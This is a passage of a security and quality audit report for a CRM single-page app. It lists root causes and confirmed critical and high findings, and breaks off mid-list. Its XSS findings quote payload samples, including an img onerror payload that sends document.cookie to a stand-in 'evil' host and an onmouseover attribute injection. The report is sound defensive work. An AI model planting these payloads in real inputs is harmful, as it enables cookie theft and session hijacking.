# DestinyOraclesSolution CRM — Full Audit Report

**Date:** 2026-07-03  ·  **Scope:** full source tree (SPA core + 33 lazy chunks + data layer + React island + service worker + build/deploy)  ·  **Method:** line-by-line multi-agent audit with adversarial verification

---

## 1. Executive summary

Every source file was read end-to-end by a dedicated auditor, plus eleven cross-cutting sweeps (startup performance, data-layer performance, authorization/scope leaks, XSS, cross-chunk integrity, build/deploy, money & dates, error handling, memory/timers, React island, live site). Each reported defect was then handed to a **separate adversarial verifier** that re-read the cited code and tried to refute it. Only findings the verifier could confirm against the actual source are counted as **confirmed** below.

### Verified defect count

| Severity | Confirmed | Notes |
|---|---|---|
| 🔴 Critical | 1 | silent data loss / cross-user leak / crash on a common path |
| 🟠 High | 70 | wrong result or broken feature on a common path |
| 🟡 Medium | 179 | edge-case bug or meaningful performance cost |
| ⚪ Low | 135 | minor / hardening |
| **Total confirmed** | **385** | across 41 audited areas |

**The audit is complete** — every one of the 41 areas passed through adversarial verification (final pass on Opus 4.8). **29 findings were refuted** and dropped. Only **4 findings remain genuinely *uncertain*** (1 high, 3 low) — not for lack of checking, but because the outcome depends on live database / RLS behavior a static source read cannot settle (e.g. whether the server rejects an empty-string date). Those 4 are in **Appendix A**.

### Confirmed defects by category

| Category | Count |
|---|---|
| functional | 90 |
| bug | 81 |
| data-integrity | 76 |
| logic | 64 |
| performance | 43 |
| security | 31 |

### The headline

The application is **feature-rich and the data model is sound**, but it is carrying a large amount of *latent* breakage concentrated in a handful of **systemic root causes** (Section 2). The single most important structural fact: this is a 75,000-line SPA split into 33 lazy-loaded chunks, and the glue that lets one chunk call another — the cross-chunk stub mechanism — is **applied inconsistently**. Dozens of buttons across the product are silently dead (or crash) depending on which chunk happened to load first. This one pattern accounts for the largest single block of confirmed high-severity findings. The second structural fact: the app serves **Malaysian users (UTC+8)** but stamps and buckets dates in **UTC** in dozens of places, so money and activity records near midnight land in the wrong day/month/quarter.

Fixing the ~10 root-cause patterns in Section 2 would resolve well over half of all 385 confirmed findings.

> **Note on overlap:** the 11 cross-cutting dimension sweeps (area names prefixed `dim:`, plus a few grouped sets) intentionally re-derive some defects the per-file auditors also found, from a different angle. Where you see the same bug in a file-area section and a `dim:` section, that is two independent confirmations, not two separate bugs.

---

## 2. Systemic root causes (fix these first — each explains many findings)

### Theme A — Cross-chunk "dead button" epidemic
*Category: functional / architecture*

**What's wrong:** The house pattern is inline `onclick="app.fn(id)"`. When `fn` lives in a chunk that isn't loaded yet, script.js is supposed to provide a *self-loading* stub (`_lazyStub` / `_loadChunkOnce`). But three incompatible stub styles coexist: **self-loading** (correct), **passive forwarder** (returns `undefined` → button silently no-ops), and **self-referencing** (the stub is exported onto `window.app`, so it calls *itself* → `RangeError: Maximum call stack size exceeded`). Because the default desktop landing view is Calendar and the eager-prefetch list is small, a user can reach most detail views *before* the owning chunk loads.

**Representative findings:** `uploadProspectDocument` recurses to stack-overflow; notification bell never initializes; forced-password-change modal can recurse; customer-detail accordions, Portal Link, per-file Delete, Bulk Reassign, Submit-for-Approval, Import/Export buttons, Quick Capture, co-agent Accept/Reject, event attendance checkboxes — all dead until an unrelated view is visited first.

**Fix:** Adopt **one** stub factory (`_lazyStub` that always `await _loadChunkOnce(chunk)` then dispatches). Generate the stub table from a single chunk→exports manifest so no cross-chunk call can be un-stubbed. Add a CI check: grep every `app.X(` reference in generated HTML and fail the build if `X` is neither in the core return nor in the stub manifest.

### Theme B — Silent write failures reported as success
*Category: data-integrity*

**What's wrong:** `AppDataStore.add()` treats *every* insert error as an offline event: it logs `console.warn(... saving locally)`, queues the row, and **returns the record object** — so the promise resolves and the caller shows a success toast. Only *activity* inserts get a real failure surface. A permanent server rejection (RLS 42501 after a token expires, a NOT-NULL/CHECK violation, a 23505 duplicate) is therefore indistinguishable from "offline, will retry". Many chunk-level save flows compound this by toasting success without awaiting/checking the result at all.

**Representative findings:** Critical `data.js` add()-never-rejects; `savePipelineConfigJson` swallows write failure; egg JSX save paths show false failures *and* false successes; mobile voice notes, WhatsApp template sends, product-photo upload, tenant provisioning, birthday wishes, renewal reminders all toast success on no-op or failure.

**Fix:** Split the offline path from the rejection path in `add()/update()`: only queue-and-succeed when the error is genuinely a network failure (`Failed to fetch`/`NetworkError`) **or** the session is known-live-but-offline. For permanent server errors (RLS, constraint) reject so the caller can surface it. Give every write flow a shared `await + check + rollback` helper; ban fire-and-forget success toasts.

### Theme C — UTC vs Malaysia (UTC+8) date handling
*Category: logic*

**What's wrong:** `new Date("YYYY-MM-DD")` parses as **UTC midnight**, and `new Date().toISOString().split('T')[0]` yields the **UTC day**. For UTC+8 users, anything between local 00:00 and 08:00 is stamped/bucketed on the *previous* calendar day, and date-only strings compared against `timestamptz` are shifted ~8h. This is repeated in dozens of independent places.

**Representative findings:** Purchase date, activity date, NPO closing date, journey due dates, protection deadlines, KPI month/week/quarter buckets, calendar prev/next navigation on month-end, NPO installment month math, pipeline `focus_month` auto-archive, egg/formula/stock-take timestamps — a sale booked at 01:30 MYT on the 1st is dated the previous month and vanishes from that month's KPI.

**Fix:** Introduce one `localDateStr(d)` (uses `getFullYear/getMonth/getDate`) and one `parseLocalDate(s)` (constructs with explicit Y,M,D parts), and replace **every** `toISOString().split('T')[0]` and `new Date("YYYY-...")` used for day/month logic. Add a lint rule banning those two patterns outside the helpers.

### Theme D — ID collisions across independent id sequences
*Category: data-integrity*

**What's wrong:** `prospects`, `customers`, and `users` each have their own numeric PK sequence, so id 42 exists in all three as different people. Several places key a merged map by bare id, or call a lookup against the *wrong* table.

**Representative findings:** `openProspectModal(customer.id)` opens/edits an unrelated prospect; mobile prospect+customer person-map resolves the wrong person (wrong name on tile, wrong WhatsApp recipient); referral-tree `showTreeNodeSidebar`/`getAncestorPath` query prospects with a user id; birthday-wish logged to the wrong record.

**Fix:** Never key by bare id across tables. Use composite keys (`type:id`) everywhere a merged collection is built, and make every `getById` call site pass the correct table for the entity's *type*, not a guess.

### Theme E — Stored & attribute-context XSS
*Category: security*

**What's wrong:** HTML is built with template literals into `innerHTML`. Most forms escape correctly, but several sinks interpolate lower-privilege-authored fields **unescaped**, or use a broken escaper (`escapeHtml(...).replace(/'/g,...)` is a no-op because the entity was already produced; `JSON.stringify` inside a double-quoted attribute breaks out). The classic threat model applies: an agent authors the value, a Super Admin's session renders it.

**Representative findings:** Edit-Agent modal (name/IC/phone/email/code), EPP bank pills, approval-queue label, egg group names/config textarea, fude story tags, NPO customer search onclick, knowledge/quarter-review product names — several are agent-authored → admin-viewed stored XSS.

**Fix:** Route **all** attribute interpolation through the existing `UI.escJsAttr`/`escapeHtml` (and fix `escJsAttr`'s `&`-last ordering bug, ui.js:31). Add a CI grep for `` `...${ `` inside `onclick="` and inside unescaped `innerHTML` sinks.

### Theme F — Missing authorization gates / scope leaks
*Category: security*

**What's wrong:** Past org-wide leaks (KPI tab, Top Referrers) were fixed, but new ones exist where a report/action aggregates org-wide data or mutates shared config without a role/scope gate — reachable by the agent band or even by direct `navigateTo`.

**Representative findings:** `setAgentPackageAmount` rewrites global pipeline config with no admin gate; Ranking Performance & the `ranking` view leak all-agent sales to scoped users; `rejectClosingRecord`/`rejectProspectConversion` miss the `isManagement` gate their siblings have; Special-Program delete/save/create UI-hidden only; WhatsApp Forward picker + order-form search dump all-customer PII to agents.

**Fix:** Gate every mutating/report function server-side-mirrored in the client: check `isSystemAdmin`/`isManagement`/`_visibleUserIds` at the top of the handler, not just by hiding the button. Push scope into the query (fail-closed) rather than filtering after fetch.

### Theme G — PostgREST 1000-row cap ignored in query()
*Category: data-integrity / logic*

**What's wrong:** `AppDataStore.query()` issues a single unpaginated `.select()`. PostgREST silently caps at 1000 rows (the code documents this and paginates in `getAll()`, but not in `query()`/`getAllSince()`). With no `ORDER BY`, the *newest* rows are the ones dropped once a table passes 1000.

**Representative findings:** Egg dedup silently stops catching duplicates → duplicate farm orders; `query()` aggregates (egg run history) undercount; delta-sync `getAllSince` drops >1000 changed rows and advances the cursor past them → permanently stale rows.

**Fix:** Paginate `query()`/`getAllSince()` with `.range()` loops like `getAll()`, or add an explicit `.order()` + hard cap with a logged warning. Never advance the delta cursor past an unpaginated fetch.

### Theme H — Non-atomic multi-insert flows + missing idempotency
*Category: data-integrity*

**What's wrong:** Several 'save' operations perform 2-3 dependent inserts client-side with no transaction, and a hard duplicate-check that then **blocks retry** after a mid-way failure — or no in-flight guard so a double-click books twice.

**Representative findings:** NPO order (3 inserts) orphans a sale on mid-failure and duplicates on retry; CPS save creates prospect+referral before the activity then can't retry; approval `new_sale`/additional-sale double-books on double-click (no `_convInFlight` lock); order-form closing saved without `lead_agent_id`.

**Fix:** Move multi-row commits behind a single Postgres RPC (server-side transaction). Add an idempotency key + in-flight lock to every approve/close/book handler and disable the button on submit.

### Theme I — Client-side full-table fetches & N+1 loops
*Category: performance*

**What's wrong:** Many views `getAll()` an entire high-volume table (activities, purchases, prospects, customers) on every render or **every keystroke**, and several loops do one awaited `getById` per row. On the NANO Supabase tier this is the real scaling ceiling.

**Representative findings:** Delivery Listing, search filters, recipient search, forms-tab search, stock inquiry — full refetch per keystroke; pipeline team sections, referral leaderboard, gcal first sync, egg commit, event delete cascade — sequential per-row round-trips (N+1).

**Fix:** Debounce search to a single scoped `queryAdvanced`; replace per-row `getById` with one batched `in`-filter query; honor the data layer's windowed-reader contract instead of `getAll()` on HIGH_VOLUME tables.

### Theme J — Build / deploy & cache-coherence
*Category: deploy*

**What's wrong:** `vercel.json` sets `Cache-Control: immutable, max-age=1y` on **all** `.js`/`.css`. Combined with the service worker, this defeats the network-first safety net: a `src/react/*` fix that ships without a manual `?v=` bump in index.html is pinned in the browser cache for a year (this exact incident is on record). The SW activate purge also deletes the app's *own* `crm-data-v1` data cache on every version bump.

**Representative findings:** React-island stale-bundle risk (manual `?v=` is the only real cache-buster); SW `activate` nukes the data-layer cache fleet-wide on deploy; unversioned bundles pinned 1 year.

**Fix:** Only mark **hash-named** assets immutable; serve `index.html`, `script.min.js`, and `react-island.js` with `no-cache` (or short max-age + revalidate). Exclude `crm-data-*` from the SW purge filter. Automate the `?v=` bump in `build.mjs` from a content hash so it can't be forgotten.

---

## 3. Confirmed CRITICAL & HIGH-severity findings (71)

Each is verified against the source. Format: **location** — title. *Failure scenario.*

### 🔴 CRITICAL (1)
- **`data.js:2189`** (data-integrity) — AppDataStore.create/update never reject — every failed server write still shows a success toast and closes the modal  
  *Agent's session token expires mid-day (the known dead-session/RLS-empty state) or the purchases table gains a constraint the client payload violates. Agent opens a customer, clicks Add Purchase, fills RM 8,800, clicks Save. Supabase rejects the insert with 42501; add() console.warns, queues locally, and returns 'success'. The agent sees 'Purchase added', the modal closes, and the row appears locally. The write never reaches the server: the boss report, leaderboard, and every other device never see the sale, and after the queue drain parks it (see next finding) it silently vanishes from the agent's own views too — with zero error shown anywhere outside DevTools.*

### 🟠 HIGH (70)
#### agents+features2
- **`chunks/script-agents.js:940`** — Agent role select silently defaults to 'Level 1 Super Admin' — silent privilege escalation on edit  
  *Admin opens Edit Profile for a user whose role is stored as 'customer' or an old 'Level 12 Ambassador' string just to fix their phone number, doesn't touch the pre-'selected' role dropdown (which silently shows Level 1 Super Admin), clicks Save — the user is written with role='Level 1 Super Admin' and role_level=1 and now sees the entire org's prospects, customers and sales.*
#### approvals+admin
- **`chunks/script-approvals.js:246`** — new_sale approval path has no in-flight guard or idempotency — double-click or partial-failure retry books the sale twice  
  *Manager double-clicks the green Approve icon on a pending New Sale row (onclick app.approveQueueEntry at line 128). Both async invocations read the entry as 'pending', both execute AppDataStore.create('purchases', ...) and _utils.adjustCustomerLtv(customer.id, amt, 1). The customer gets two identical purchase rows and lifetime_value/total_purchases doubled for that sale — corrupting LTV, leaderboards and commission-bearing KPI reports.*
#### auth+data-helpers+push-notifications+sw+build
- **`sw.js:64`** — SW activate purge deletes the app's own crm-data-v1 data cache on every upgrade  
  *A deploy bumps CACHE_VERSION. On activation the SW deletes crm-data-v1 across all ~3,000 clients at the same moment SW_ACTIVATED triggers the jittered fleet-wide reload (sw-init.js). Every heavy user (whose large tables — prospects/activities — had overflowed localStorage into the Cache API) reloads with an empty data cache and must full-refetch those tables from the NANO Supabase instance: exactly the thundering-herd/521 outage pattern the project documents. A user who is offline right after the upgrade loses access to those cached tables entirely and sees empty/seeded lists.*
#### boss-report+forms+whatsapp
- **`chunks/script-whatsapp.js:314`** — "Schedule for later" option is rendered but completely ignored — message always sends immediately  
  *An agent opens the WhatsApp send modal at 11pm, types a message, selects "Schedule for later" expecting to pick a time or have it deferred, and clicks Send. The message is delivered to the customer's WhatsApp immediately (late-night customer-facing message), with a success toast implying the chosen option worked.*
#### activities
- **`chunks/script-activities.js:4825`** — Selecting an Agent in the entity picker writes the user's id into activity.customer_id  
  *An agent logs an FTF meeting with a colleague and picks the colleague (type 'Agent', users.id = 12) from the search dropdown. The activity is saved with customer_id = 12. If customers row 12 exists (customer ids and user ids are independent numeric sequences), the meeting appears in an unrelated customer's Meet Up History and activity feeds (cross-record data mix visible to that customer's owner); if no such customer exists, the insert either violates the FK (save fails with a cryptic error) or leaves a dangling reference that breaks joins.*
#### calendar
- **`chunks/script-calendar.js:891`** — dispatchAfterCpsTriggers match gate is vacuously true — every after_cps template fires for every prospect  
  *Agent logs a CPS activity for a prospect whose only proposed solution is 画作. dispatchAfterCpsTriggers runs pr_9star (solution_category_match='Power Ring', interest/solution lists empty): interestOk and solutionOk are vacuously true so the template is NOT skipped, and executeEventBasedTrigger queues a Power-Ring-class invite draft for a prospect with zero Power Ring interest — likewise for every other category template with a matching upcoming event, until the 6-per-30-day comfort ceiling fills the agent's Follow-Up panel with wrong-category invites.*
- **`chunks/script-calendar.js:2327`** — Pending Proposed Solutions 'Update' button silently no-ops — openEditSolutionModal stub never loads the prospects chunk  
  *Agent logs in (calendar is the landing view), sees '3 Pending Proposed Solutions' with one flagged overdue, and clicks the 'Update' button to record the client's decision: nothing happens — no modal, no toast, no console error. The agent can only update the solution by first navigating to the Prospects page, which nothing tells them to do.*
- **`chunks/script-calendar.js:4922`** — Attendance checkboxes and attendee actions in the activity-details modal call activities-chunk functions that have no lazy stub  
  *User logs in, lands on the calendar (default view, only the calendar chunk loads), taps an EVENT activity tile and ticks 'Attended' for a client: the browser throws TypeError: app.toggleAttendeeAttended is not a function. The checkbox visually flips to checked but nothing is written to event_attendees — the agent believes attendance was recorded when it silently wasn't, until some other action happens to load the activities chunk.*
- **`chunks/script-calendar.js:5529`** — CPS_SCAN_FIELD_MAP is out of scope — OCR autofill from calendar 'Upload CPS' always throws and never opens the review modal  
  *Agent opens an activity's details on the calendar, taps 'Upload CPS', and photographs the form. The upload succeeds and the cps-form-ocr edge function returns extracted fields, but building the `current` diff snapshot throws ReferenceError: CPS_SCAN_FIELD_MAP is not defined — 100% of the time, on every machine — so the side-by-side scan-review modal never opens and the agent must retype every field manually despite a successful OCR.*
#### customers
- **`chunks/script-customers.js:654`** — Customer Edit button passes customer.id to openProspectModal, which looks up the prospects table  
  *System Admin opens customer C482's detail and clicks the Edit pencil. Prospect id 482 exists (different person). The modal opens pre-filled with prospect 482's name/phone; the admin 'corrects' the name to the customer's and saves — prospect 482 (an unrelated lead) is silently renamed and corrupted.*
- **`chunks/script-customers.js:658`** — Portal Link button calls app.sendPortalLink which has no stub and lives in the forms chunk  
  *An L5 team leader opens any customer detail and clicks the Portal Link icon to send the customer their portal access: 'TypeError: app.sendPortalLink is not a function' in console, no toast, nothing sent — the feature is permanently dead for the entire agent band.*
- **`chunks/script-customers.js:682`** — Customer-detail accordions dead unless prospects chunk is loaded (toggleCustomerAccordion is cross-chunk with a passive stub)  
  *Desktop user logs in (lands on Calendar), uses global search to open a customer, clicks the 'Bank & Payment' or 'Notes' accordion header: nothing happens (app.toggleCustomerAccordion resolves to the no-op stub because script-prospects.min.js was never loaded). Adding a purchase from the same view saves the row but throws 'window.app.renderCustomerClosingTab is not a function' in the console.*
#### daily-note
- **`chunks/script-daily-note.js:3073`** — 60s auto-close timer blindly closes whatever modal is open, destroying unrelated modals and typed form input  
  *Agent's first login of the day: daily note appears ~1s after landing, agent clicks 'Got it' at T+5s, then opens 'Log Activity' or 'Edit Prospect' modal at T+30s and is mid-way through typing notes at T+60s — the modal silently vanishes (overlay.innerHTML='') and all typed, unsaved input is lost. Happens once per user per day on the normal login path.*
#### egg
- **`chunks/script-egg.js:393`** — History dedup silently capped at 1000 rows — duplicate farm orders once egg_processed_orders grows  
  *After ~N weeks of runs the table passes 1000 rows. The admin uploads this week's CSV/XLSX which (as usual) still contains last week's order lines; last week's rows fell outside the 1000-row window, so dedup does not filter them, they appear as 'new', are counted into the farm order totals, and duplicate cartons are ordered from the farm and re-persisted to history.*
#### fude
- **`chunks/script-fude.js:172`** — Story tag filter chips: JSON.stringify inside a double-quoted onclick attribute breaks every chip and allows attribute-injection XSS from tag text  
  *Admin creates a success story with tag 'é£Žæ°´'. On the ç¦å¾· view, the filter bar renders a #é£Žæ°´ chip; clicking it throws 'SyntaxError: missing ) after argument list' and no filtering happens — every tag chip except the hardcoded 'All' chip is dead. Separately, an L2 marketing manager saving a highlight with tag 'x onmouseover=alert(document.cookie)' plants a handler that fires in every member's browser viewing the stories grid.*
- **`chunks/script-fude.js:918`** — changeLeaderboardPeriod calls out-of-scope renderLeaderboard (ReferenceError) and its registration clobbers the working referrals-chunk copy  
  *Agent opens the Referrals view (leaderboard renders, period select works), then visits the ç¦å¾· tab (fude chunk loads and re-registers changeLeaderboardPeriod, console warns about the redefinition), then returns to Referrals and changes the leaderboard period select to 'This Month' → _state.lbp changes but renderLeaderboard() throws ReferenceError; the leaderboard never re-renders and the period filter stays broken until a full page reload.*
- **`chunks/script-fude.js:973`** — submitRecruitmentApproval is unreachable from the recruit modal unless the fude chunk happens to be loaded — Submit for Approval silently does nothing  
  *An agent logs in, opens Customers/Prospects, opens the Recruit modal for a customer, fills the recruitment form and clicks 'Submit for Approval'. Because the fude chunk was never loaded in this session, app.submitRecruitmentApproval resolves to the script.js placeholder which returns undefined: no approval_queue row is created, no toast appears, the modal stays open. The user believes the click failed or retries; the recruitment approval is silently never submitted.*
- **`chunks/script-fude.js:1016`** — deleteFile / showProfile / exportKPIDashboard live in the fude chunk but are clicked from documents/marketing views — buttons silently dead until the fude view is visited  
  *A user opens the Documents tab (documents chunk loads, fude chunk does not), clicks the trash icon on a file → app.deleteFile(id) hits the script.js placeholder and returns undefined: no confirm modal, no deletion, no error. Same for the 'Export KPI Dashboard' button in Marketing and the customer-name profile link in the Last-Transactions modal — all silently no-op until the user happens to visit the ç¦å¾· view in the same session.*
#### import
- **`chunks/script-import.js:848`** — Duplicate-handling choice is read on step 5 after the step-4 radios were destroyed — 'Update existing' and 'Create as new (merge)' never take effect  
  *Team leader imports an updated customer list, selects 'Update existing records' on step 4, clicks Next then START IMPORT. Every duplicate row is silently skipped instead of updated; the toast reports 'N skipped' and the spreadsheet corrections (new phone numbers, addresses, LTV) never reach the database. Same for 'Create as new (merge)'.*
- **`chunks/script-import.js:1202`** — Protection Monitoring classifies EVERY prospect as Critical when the prospects chunk isn't loaded (calculateProtectionDays falls back to () => 0)  
  *Manager logs in (lands on Calendar), clicks Protection Monitoring in the sidebar without visiting Prospects first. Team summary cards show 100% of prospects as Critical (0 Active/Attention/Inactive) and the inactive list labels everything 🔴 Critical — the view silently shows completely wrong numbers until the user happens to visit the Prospects view and returns.*
#### marketing
- **`chunks/script-marketing.js:453`** — Special Programs tab shows blank progress (or literal 'undefined') because script-features2 is never loaded  
  *L1/L2 user on desktop logs in (lands on calendar; features2 only ever loads via the 'milestones' view or mobile init), opens Product & Event Manager →  Special Programs. In the default React path every participant row renders with empty Sales/Customers/CPS cells and 'not qualified' even though real progress exists; in the legacy path the tab body renders the literal text 'undefined'. Clicking 'New Program' does nothing.*
- **`chunks/script-marketing.js:4263`** — Campaign launch always computes 0 recipients — audience checkboxes are gone from the DOM at step 4  
  *Marketing manager creates a campaign, checks 'Birthday This Month' at step 3 (preview shows e.g. 42 recipients), clicks Next then 'Launch Campaign'. calculateAudienceSize finds zero checked inputs, returns [], so the campaign is saved with total_recipients=0, zero campaign_messages rows are created, simulateCampaignSending loops over nothing and immediately marks the campaign 'completed'. Every launched campaign reaches nobody while the UI toasts 'Campaign launched successfully!'.*
#### mobile
- **`chunks/script-mobile.js:2138`** — Merged prospect+customer person map keyed by bare id resolves the wrong person on id collision  
  *Activity row has prospect_id=42; an unrelated customer with id=42 exists. The calendar tile and day sheet display customer 42's name instead of prospect 42's, and tapping the appointment-WhatsApp button in mcalWa opens a chat to customer 42's phone with a reminder about prospect 42's appointment — the wrong client receives the message.*
#### pipeline
- **`chunks/script-pipeline.js:2508`** — setAgentPackageAmount has no role check — any agent can rewrite the global pipeline config  
  *A Level-10 agent opens the Pipeline tab, sees 'Varies [edit]' on a prospect whose best category is ä»£ç†é…å¥—, clicks [edit] and enters 1 — savePipelineConfigJson writes config version+1 to the global pipeline_config row, changing the displayed deal amount for every agent org-wide and polluting the admin-only config history.*
#### prospects
- **`chunks/script-prospects.js:1453`** — Bulk Reassign silently dead-ends when script-import.js is not loaded  
  *Fresh session, leader/admin goes straight to Prospects, ticks several prospects, clicks Reassign in the bulk bar, picks an agent, clicks 'Reassign'. _showReassignConfirmPopup resolves to the () => {} fallback: no confirm popup appears, no reassignment is written, no error is shown — the modal just sits there. Works only if the user happened to visit Import/Protection or use the row agent-dropdown first.*
- **`chunks/script-prospects.js:2315`** — Customer Forms accordion Fill/Edit buttons no-op unless the fude chunk is loaded  
  *Agent logs in on desktop, opens a prospect, expands 'Customer Forms 客户表格', clicks 'Fill' on New Customer Survey / CPS Analysis / APU Appraisal / 3-Year Blueprint. Nothing happens — no modal, no toast, no console error visible to the user. The Survey→CPS→APU→Blueprint workflow shown in the tab is unusable until the user coincidentally visits the fude view in the same session.*
#### referrals
- **`chunks/script-referrals.js:1234`** — Clicking any agent/user node in the tree opens no sidebar (or a same-id prospect's data)  
  *Every user opening the Referrals view gets a tree rooted at themselves ('user' type). Clicking the root node — or any blue agent node — does nothing (no sidebar, no error); if a prospect happens to share the agent's numeric id, the sidebar shows that unrelated prospect's contact details and referral chain instead.*
- **`chunks/script-referrals.js:1578`** — "New" prospect button in Add Referral modal silently no-ops unless prospects chunk already loaded  
  *User logs in, navigates directly to Referrals (never visiting Prospects), clicks 'Add Referral' → 'New' to create the referred prospect: nothing happens at all — no modal, no error, no toast. The referral flow is dead until the user happens to visit a prospects view first.*
#### reporting
- **`chunks/script-reporting.js:2254`** — Stored XSS: agent-entered epp_bank rendered unescaped in EPP drill-down bank pills  
  *An agent saves an EPP purchase with bank name `<img src=x onerror="fetch('https://evil/'+document.cookie)">`. When a Super Admin clicks the 'EPP Cases' KPI card, the modal HTML is set via UI.showModal and the payload executes in the admin's session.*
- **`chunks/script-reporting.js:3163`** — Agent leaderboard passes no from/to to getDateRanges — breaks entirely under the custom date filter  
  *A manager picks any From/To in the dashboard's date-range picker. refreshKPIDashboard re-renders and the 'Agent Performance Leaderboard' now shows every agent at RM 0 with 'Stable' trend (or an arbitrary top-10 of zeros), while the KPI cards above show the correct custom-range figures.*
#### search
- **`chunks/script-search.js:2042`** — loadSavedSearch never restores basic filters — saved searches silently execute unfiltered  
  *An agent builds a prospect search 'Status = lost, Responsible Agent = X, Score min 50', saves it as 'Lost hot leads', and later clicks it under Saved Searches. The search runs with no basic filters and returns EVERY visible prospect (up to thousands of rows) instead of the saved subset — silently wrong results with no error, and an export from that state produces a wrong CSV.*
#### stock-take
- **`chunks/script-stock-take.js:539`** — On the default full-JSX render path, modal-completed mutations never refresh the view (new session invisible, tabs stuck on 'Activate a session first')  
  *Admin opens Stock Take (JSX default), clicks New Session, fills the modal, clicks Create. Toast says 'Session created' but the sessions table still shows 'No sessions yet' and every other tab still renders 'Activate a session first' because the payload was built with sessionId=null. The admin must navigate away and back to see their own session. Same staleness after saving a recount from the Recount modal.*
- **`chunks/script-stock-take.js:1253`** — Adjustment File export writes New_System_Qty=0 for SKUs that were never counted (partial stock take zeroes ERP stock)  
  *Admin counts only the Puchong warehouse in a session whose System Stock import covers 3 locations, then clicks 'Adjustment File'. The CSV contains every SKU of the 2 uncounted retail stores with New_System_Qty=0. Importing it into the ERP wipes the system quantities of all uncounted stock — exactly the hazard the stAcceptVariances comment warns about, left open on the export path.*
- **`chunks/script-stock-take.js:1996`** — Scan-shelf count sheet cannot add any row when the shelf has no expected SKUs ('Cannot find table structure')  
  *A counter scans the QR of a newly added shelf that has no st_shelf_expected mapping yet (the normal state right after creating shelves). They type a SKU and qty and press + Add: toast 'Cannot find table structure'. There is no way to record any count via the scan flow for that shelf.*
- **`chunks/script-stock-take.js:2076`** — Multi-device sync never backfills st_counts — counts made while a device was not subscribed are silently missing from its reconciliation  
  *Staff scan 300 items on phones while the admin's laptop is closed. Admin opens the Stock Take view afterwards: stStartRealtime subscribes but the 300 existing st_counts rows are never fetched, so Reconciliation shows those SKUs as phys=0 → 'Recount Required', and an Accept/Adjustment based on it is wrong. No error or warning is shown.*
#### data
- **`data.js:526`** — loadCalendarDashboard primes the canonical 'users' cache/snapshot with lean RPC rows missing agent_code, team and employment_type  
  *Admin opens Calendar, then within the cache TTL opens the Agents list: getAll('users') hits the freshly-primed lean cache and every agent row shows Agent ID "N/A" and Team "Unassigned"; the operating-hours KPI reads employment_type=undefined and misclassifies FT/PT agents. Because last_sync was bumped, delta sync never restores the missing columns for unchanged rows — the lean snapshot persists until the once-per-session full reconcile happens to run, and is re-poisoned on every calendar visit.*
- **`data.js:2207`** — invalidateCache() after every write deletes the just-written local mirror — offline saves blank the entire list and online writes force a full-table cold refetch  
  *Offline (or during a Supabase blip) with a still-valid token: user saves a prospect → add() falls to the local path, writes the row to fs_crm_prospects and the sync queue, then invalidateCache wipes fs_crm_prospects → emit('dataChanged') re-renders the view → getAll('prospects') finds no in-memory cache, no localStorage snapshot, network throws → the catch at line 1637 reads the (now deleted) snapshot and returns [] — the whole prospects list renders EMPTY until reconnect, despite the offline-cache design. Online, the same wipe means every single activity/prospect edit forces the next read to re-download the entire table (cursor gone, no delta), which for the org-wide activities table is a multi-MB fetch after each save.*
- **`data.js:3663`** — Journey touchpoint snooze is a complete no-op — status reset to 'pending' with unchanged due_date and nothing ever reads snooze_until  
  *Agent clicks "Snooze 7 days" on a due touchpoint: the row's status becomes 'pending' with the old (past/today) due_date, so it reappears in the Due Today list on the very next render, and the nightly cron re-marks it 'overdue'. The snooze button visibly does nothing; the snoozed icon/status never even shows because status is immediately reset to 'pending'.*
#### dim:authz
- **`chunks/script-performance.js:93`** — Ranking Performance view leaks org-wide agent sales to scope-restricted managers/agents  
  *An L3 'Senior Managers' user (whose getVisibleUserIds resolves to only their downline subtree) clicks the 'Ranking Performance' sidebar entry. showRankingPerformanceView renders a leaderboard of ALL agents company-wide with each agent's total sales and performance score, exposing sales data for agents in other teams the manager has no authority over.*
#### dim:build-deploy
- **`vercel.json:49`** — React island updates rely solely on a manual ?v= bump; both coded safety nets are ineffective against the 1-year immutable HTTP cache  
  *A src/react change is pushed (bundle rebuilt locally or by Vercel's vite step) without editing '?v=2026-06-28-1' in index.html:707. Every returning client requests the identical URL 'react-dist/react-island.js?v=2026-06-28-1'; the browser HTTP cache serves the old immutable copy with zero revalidation for up to a year, the SW's fetch() is satisfied from that same HTTP cache, and all users keep running the old React UI — silently calling app/chunk functions whose signatures may have changed in the same deploy — until someone notices and bumps the token.*
#### dim:cross-chunk
- **`chunks/script-calendar.js:2482`** — Co-agent invite Accept/Reject buttons on the calendar grid throw when the activities chunk is not loaded  
  *Agent A adds Agent B as co-agent. Agent B logs in on desktop, lands on the calendar, sees the pending invite card, clicks 'Accept': the inline handler throws 'app.respondCoAgentInvite is not a function', nothing happens, no toast — the invite stays pending and B assumes it was accepted. Works only if B previously opened an activity form/list in the same session.*
- **`chunks/script-calendar.js:4788`** — Activity-details modal attendance/invite controls call activities-chunk functions without loading the chunk — attendance ticks silently not saved  
  *Desktop user logs in (default landing view IS the calendar), clicks an EVENT activity, and ticks the 'Attended' checkbox for an attendee: app.toggleAttendeeAttended is undefined, the inline handler throws TypeError, the checkbox stays visually checked but no write happens — attendance (and the points/registration cascade) is silently lost on next refresh. Same for marking Paid/Ticket, removing an agent attendee, or accepting a consultant invite from the modal.*
- **`chunks/script-cps.js:235`** — Notification-panel co-agent invite Accept/Reject buttons are dead (cps chunk renders activities-owned handler)  
  *Agent clicks the header bell straight after login, sees 'Co-agent invitation: FTF', clicks Accept: TypeError on app.respondCoAgentInvite, the invite is not accepted, the panel stays open, and there is no error feedback. The invitation remains pending indefinitely unless the agent later loads the activities chunk and retries.*
- **`chunks/script-customers.js:671`** — Customer profile accordion sections are inert until the prospects chunk loads (toggleCustomerAccordion is prospects-owned behind a passive stub)  
  *Fresh login (desktop or mobile) -> navigate to Customers (loads only script-customers) -> open any customer -> click 'Basic Info & Bank' or 'Closing' or any other section header. The passive stub finds window.app.toggleCustomerAccordion still pointing at itself, returns undefined, and nothing expands — the entire customer profile body is unusable until the user happens to visit the Prospects view in the same session.*
- **`chunks/script-import.js:82`** — All export buttons on the Import/Export view are dead unless the Prospects view was visited first (exportData is prospects-owned)  
  *L1/L2 user logs in and goes directly to Import/Export from the sidebar, clicks 'CSV' next to Prospects: the passive stub silently returns undefined — no file downloads, no toast, no console error. Every export button on the page is a silent no-op until the user first opens the Prospects view in the same session.*
- **`chunks/script-prospects.js:6398`** — 'Convert Customer to Agent' submit silently does nothing — submitRecruitmentApproval lives in the fude chunk  
